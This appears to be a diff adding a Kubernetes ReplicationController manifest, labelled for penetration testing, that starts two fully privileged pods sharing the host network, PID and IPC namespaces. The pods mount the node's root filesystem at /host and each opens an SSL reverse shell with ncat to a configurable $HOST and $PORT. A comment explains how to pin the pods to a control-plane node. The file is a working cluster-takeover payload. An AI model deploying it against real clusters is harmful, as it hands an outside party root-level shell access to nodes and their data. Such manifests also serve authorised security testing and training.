@@ -1,0 +1,37 @@
+apiVersion: v1
+kind: ReplicationController
+metadata:
+  name: everything-allowed-revshell-replicationcontroller
+  labels:
+    app: pentest
+    type: replicationcontroller
+spec:
+  replicas: 2
+  selector:
+    app: pentest
+    type: replicationcontroller
+  template:
+    metadata:
+      labels:
+        app: pentest
+        type: replicationcontroller
+    spec:
+      hostNetwork: true
+      hostPID: true
+      hostIPC: true
+      containers:
+      - name: everything-allowed-revshell-replicationcontroller
+        image: raesene/ncat
+        command: [ "/bin/sh", "-c", "--" ]
+        args: [ "ncat --ssl $HOST $PORT -e /bin/bash;" ]
+        securityContext:
+          privileged: true
+        volumeMounts:
+        - mountPath: /host
+          name: noderoot
+      #nodeName: k8s-control-plane-node # Force your pod to run on the control-plane node by uncommenting this line and changing to a control-plane node name
+      volumes:
+      - name: noderoot
+        hostPath:
+          path: /
+      
